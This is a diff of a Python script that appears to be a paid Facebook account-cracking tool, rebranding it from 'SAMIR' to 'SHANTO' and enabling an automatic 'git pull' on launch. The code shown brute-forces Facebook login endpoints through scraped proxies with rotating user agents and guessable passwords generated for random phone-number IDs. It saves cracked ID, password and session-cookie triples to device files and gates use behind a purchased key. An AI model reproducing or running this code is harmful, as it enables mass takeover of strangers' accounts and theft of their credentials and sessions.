@@ -43,7 +43,7 @@ except ModuleNotFoundError:
 except:pass
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
-#os.system("git pull")
+os.system("git pull")
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
@@ -98,7 +98,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox) 
 except Exception as e:
-	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SAMIR-XD')
+	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SHANTO-XD')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -214,7 +214,7 @@ else:
     a = ltx
     tag = "\x1b[1;96mAM"
 
-def _SAMIR_(u):
+def _SHANTO_(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.000)
         
 
@@ -241,21 +241,21 @@ ____  ___  _____          _____.__
 def menu():
 	os.system('clear')
 	banner()
-	_SAMIR_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
-	_SAMIR_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
-	_SAMIR_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
-	_SAMIR_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
-	_SAMIR_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
-	_____SAMIR_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
-	if _____SAMIR_____ in ['1']:
+	_SHANTO_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
+	_SHANTO_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
+	_SHANTO_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
+	_SHANTO_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
+	_SHANTO_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
+	_____SHANTO_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
+	if _____SHANTO_____ in ['1']:
 		C1()
-	if _____SAMIR_____ in ['2']:
+	if _____SHANTO_____ in ['2']:
 		Y2()
-	if _____SAMIR_____ in ['3']:
+	if _____SHANTO_____ in ['3']:
 		BER()
-	if _____SAMIR_____ in ['4']:
+	if _____SHANTO_____ in ['4']:
 		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
-	if _____SAMIR_____ in ['0']:
+	if _____SHANTO_____ in ['0']:
 		exit()
 	
 		
@@ -358,7 +358,7 @@ def Settings():
 def passwrd():
 	os.system('clear')
 	banner()
-	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(SAMIR_NAME))
+	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(SHANTO_NAME))
 	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] TOTAL ID       \033[1;34m: \033[0;92m"+str(len(id)))
 	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START TIME     \033[1;34m: \033[0;96m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
 	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START DATE     \033[1;34m: \033[0;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
@@ -423,7 +423,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo} [SAMIR] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
+	sys.stdout.write(f"\r{bo} [SHANTO] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -440,7 +440,7 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r\x1b[1;91m [\033[1;91mSAMIR-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
+				print(f'\r\x1b[1;91m [\033[1;91mSHANTO-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -448,9 +448,9 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [\033[1;92mSAMIR-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
+				print(f'\r\x1b[1;92m [\033[1;92mSHANTO-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
 				cek_apk(session,coki)
-				open('/sdcard/SAMIR-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/SHANTO-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				akun.append(idf+'|'+pw)
 				break
 				
@@ -484,7 +484,7 @@ def Y2():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=50) as SAMIR:
+    with ThreadPool(max_workers=50) as SHANTO:
         clear()
         tl = str(len(user))      
         print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m NAME           \033[1;34m: \033[0;92m"+name)
@@ -496,7 +496,7 @@ def Y2():
         for love in user:
             pwv = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','khan123','11223344','freefire']
             uid = code+love
-            SAMIR.submit(SAMIR,uid,pwv,tl)
+            SHANTO.submit(SHANTO,uid,pwv,tl)
     print(' CRACK PROCESS HAS BEEN COMPLETED ')
     
     
@@ -570,23 +570,23 @@ def rcerek(uid,pwx,tl):
         	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
         	    cid = coki[151:166]
         	    print ('')
-        	    print('\033[1;92m[\033[1;92mSAMIR-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
+        	    print('\033[1;92m[\033[1;92mSHANTO-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
         	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
         	    cek_apk(session,coki)
-        	    open('/sdcard/SAMIR-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
+        	    open('/sdcard/SHANTO-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
         	    oks.append(uid)
         	    break 
         	else:
         	    continue
         loop+=1
-        sys.stdout.write('\r%s[SAMIR-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[SHANTO-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
 	
     except:
      pass
 
 
-def SAMIR(uid,pwv,tl):
+def SHANTO(uid,pwv,tl):
     global loop
     global cps
     global oks
@@ -629,22 +629,22 @@ def SAMIR(uid,pwv,tl):
         	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
         	    cid = coki[151:166]
         	    print ('')
-        	    print('\033[1;92m[\033[1;92mSAMIR-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
+        	    print('\033[1;92m[\033[1;92mSHANTO-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
         	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
         	    cek_apk(session,coki)
-        	    open('/sdcard/SAMIR-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
+        	    open('/sdcard/SHANTO-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
         	    oks.append(uid)
         	    break 
             else:
         	    continue
         loop+=1
-        sys.stdout.write('\r%s[SAMIR-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[SHANTO-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
 
 def mex():
-    imt = '=SAMIR=XD='
+    imt = '=SHANTO=XD='
     os.system('clear')
     banner()   
     try:
@@ -664,9 +664,9 @@ def mex():
         kok.close()
         print ('')
         input('   \x1b[0;34mENTER TO BUY TOOLS ')
-        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SAMIR%20Paid%20Tools.%20My%20Key:%20'+key1)
+        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SHANTO%20Paid%20Tools.%20My%20Key:%20'+key1)
         mex()
-    r = requests.get('https://raw.githubusercontent.com/MrSAMIR156/approved.txt/main/approved.%20txt').text
+    r = requests.get('https://raw.githubusercontent.com/MrSHANTO156/approved.txt/main/approved.%20txt').text
     if key1 in r:
         print("\33[1;32mYour Token is Successfully Approved")
         time.sleep(0.5)
@@ -684,7 +684,7 @@ def mex():
         print ('\x1b[0;34mIF YOU BUY TOOLS CONTACT ME')
         print ('')
         input('\033[1;92mIf you want to buy presh entero ')
-        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SAMIR%20Paid%20Tools.%20My%20Key:%20'+key1)
+        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SHANTO%20Paid%20Tools.%20My%20Key:%20'+key1)
         mex()
 ##################
 
